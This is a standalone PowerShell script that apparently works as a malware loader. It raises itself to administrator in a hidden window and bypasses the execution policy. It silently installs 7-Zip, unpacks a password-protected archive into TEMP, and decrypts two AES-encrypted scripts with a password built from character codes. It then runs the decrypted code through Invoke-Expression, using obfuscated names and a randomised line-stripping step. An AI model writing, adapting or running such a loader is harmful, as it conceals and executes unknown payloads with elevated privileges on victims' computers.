﻿$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()); if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { $script = [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo] @{ FileName = "powershell.exe"; Arguments = "-NoProfile -WindowStyle Hidden -executionpolicy bypass -noninteractive -File `"$PSCommandPath`""; Verb = "runas"; }); exit; }; $executionPolicy = Get-ExecutionPolicy; if ($executionPolicy -ne "Bypass") { Set-ExecutionPolicy RemoteSigned -Force; Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process -Force; }
$zipExe = "C:\Program Files\7-Zip\7z.exe"; $FC= $PSScriptRoot; if (-not (Test-Path $zipExe)) { Start-Process -FilePath "$($FC)\7z2401-x64.exe" -ArgumentList "/S" -Wait }; $lv= "09718724077e4a4f9247"; $zFq = "$($FC)\Quang1.7z"; $pZq = "Quang"; $dFq = $env:TEMP; & $zipExe x "$zFq" -o"$dFq" -p"$pZq" -aoa; $enq = @("$($dFq)\cfgenA.ps1", "$($dFq)\cfgenB.ps1"); $deq = @("$($dFq)\cfgdeA.ps1", "$($dFq)\cfgdeB.ps1"); $arstrq=89,111,117,114,80,97,115,115,119,111,114,100,49,50,51; $str1q = [char[]]$arstrq -join ""; $arstrq=112,97,115,115; $str2q = [char[]]$arstrq -join "";Set-Variable -Name $str2q -Value $str1q -Scope "Global"; for ($iq=0; $iq -lt $enq.Length; $iq++) { $salt = New-Object byte[] 8; $iSq = [System.IO.File]::OpenRead($enq[$iq]); $iSq.Read($salt, 0, $salt.Length); $iSq.Close(); $dBq = New-Object Security.Cryptography.Rfc2898DeriveBytes -ArgumentList @($pass, $salt, 1000); $key = $dBq.GetBytes(16); $iv = $dBq.GetBytes(16); $aes = New-Object Security.Cryptography.RijndaelManaged; $aes.Key = $key; $aes.IV = $iv; $aes.Mode = [Security.Cryptography.CipherMode]::CBC; $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7; $iSq = [System.IO.File]::OpenRead($enq[$iq]); $iSq.Seek($salt.Length, [System.IO.SeekOrigin]::Begin); $oSq = [System.IO.File]::Create($deq[$iq]); $cSq = New-Object Security.Cryptography.CryptoStream -ArgumentList @($iSq, $aes.CreateDecryptor(), 'Read'); $buffer = New-Object byte[] 4096; while ($readBytes = $cSq.Read($buffer, 0, $buffer.Length)) { $oSq.Write($buffer, 0, $readBytes) }; $cSq.Close(); $oSq.Close(); $iSq.Close(); if ($iq -eq 0) { $linesq = Get-Content -Path $deq[$iq]; $countq=0; $strq=""; $maxq = 20; $nq = Get-Random -Minimum 1 -Maximum $maxq; foreach ($lineq in $linesq) { $countq += 1; if ($countq -eq $nq) { $arq = $lineq -split " -Value "; $lineq = $arq[0] -replace $arq[2], ""; $lineq = $lineq + " -Value " + ($arq[1] -replace $arq[3], ""); Invoke-Expression $lineq; $lineq = $null; }; if ($countq -ge ($maxq + 1)) { $strq = $strq + "`n" +  $lineq }; }; }; if ($iq -eq 1) { $linesq = Get-Content -Path $deq[$iq]; $countq=0; $strq=""; foreach ($lineq in $linesq) { $countq += 1; $strq = $strq + "`n" +  $lineq }; }; Invoke-Expression $strq; $strq = $null; };